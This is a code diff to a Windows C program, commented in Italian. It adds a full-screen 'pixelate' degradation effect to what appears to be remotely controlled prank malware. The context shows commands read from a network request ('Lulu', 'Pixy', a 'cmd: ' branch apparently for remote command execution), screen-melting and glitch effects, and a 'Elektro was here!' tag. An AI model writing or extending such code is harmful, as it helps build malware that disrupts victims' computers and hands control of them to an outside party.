@@ -112,6 +112,9 @@ void ltunnel_run() {
     Sleep(10);
 }
 
+// ho capito che hdc significa HandleDeviceContext, tradotto: accesso grafico allo schermo
+// Invece GetDC(NULL) si piglia tutto schermo. Forse già lo sapevi
+// DC = DeviceContext
 void squarefx_run() {
     w = GetSystemMetrics(SM_CXSCREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
@@ -157,9 +160,33 @@ void squarefx_run() {
     Sleep(5);
 }
 
-// ho capito che hdc significa HandleDeviceContext, tradotto: accesso grafico allo schermo
-// Invece GetDC(NULL) si piglia tutto schermo. Forse già lo sapevi
-// DC = DeviceContext
+// avevo pensato qualcosa del tipo: progressivita' dell'aggravamento. Ogni tot si diminuisce la reso
+//Update: se divido per 2 l'effetto si interrompe alla prima degradata, se divido per un valore>2 il degrado e' progressivo
+// ATTENTO: non fare: "HDC small" small e' una cosa di windows preistorica. Quindi ho usato smally
+void pixelate() {
+    int w = GetSystemMetrics(SM_CXSCREEN);
+    int h = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC hdc = GetDC(NULL);
+
+    // un compatibleDC crea in ram una tela che non viene mostrata (serve per lavorare e non mostrare schifo nel monitor)
+    HDC smally = CreateCompatibleDC(hdc);
+    HBITMAP smallybmp = CreateCompatibleBitmap(hdc, w/2, h/2); //  qui ci sta il hdc ma scalato di pixel
+
+    SelectObject(smally, smallybmp); // inserisce smallybmp dentro smally
+
+    StretchBlt(smally, 0, 0, w/2.1, h/2.1, hdc, 0, 0, w, h, SRCCOPY); // prendi il hdc e lo copi su smally
+    SetStretchBltMode(hdc, COLORONCOLOR); // coloroncolor = no blur, no smooth, only raw pixelz
+    StretchBlt(hdc, 0, 0, w, h, smally, 0, 0, w/2.1, h/2.1, SRCCOPY); // prende bitmap piccola e la allarga in full
+
+    //togli schifo
+    DeleteObject(smallybmp);
+    DeleteDC(smally);
+    ReleaseDC(NULL, hdc);
+
+    Sleep(1000);
+}
+
 void lulu() {
     w = GetSystemMetrics(SM_CXSCREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
@@ -270,6 +297,7 @@ void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs'
     while (1) {
         if (GetTickCount64() - elapsed < 1000) {TextOut(hdc, w, h, "Elektro was here!", 17);}
         else if (GetTickCount64() - elapsed < 11000) {fkngmelter();}
+        else if (GetTickCount64() - elapsed < 12000) {pixelate();}
         else if (GetTickCount64() - elapsed < 13000) {heightglitch_run();}
         else if (GetTickCount64() - elapsed < 14000) {TextOut(hdc, w, h, "Subwoofer", 9);}
         else if (GetTickCount64() - elapsed < 16000) {widthglitch_run();}
@@ -365,6 +393,10 @@ int main() {
         else if (strstr(reqtextbuffer, "Lulu")) {
             int i;
             for (i=0;i<500;i++) {lulu();}
+        }
+        else if (strstr(reqtextbuffer, "Pixy")) {
+            int i;
+            for (i=0;i<1000;i++) {pixelate();}
         }
 
         else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
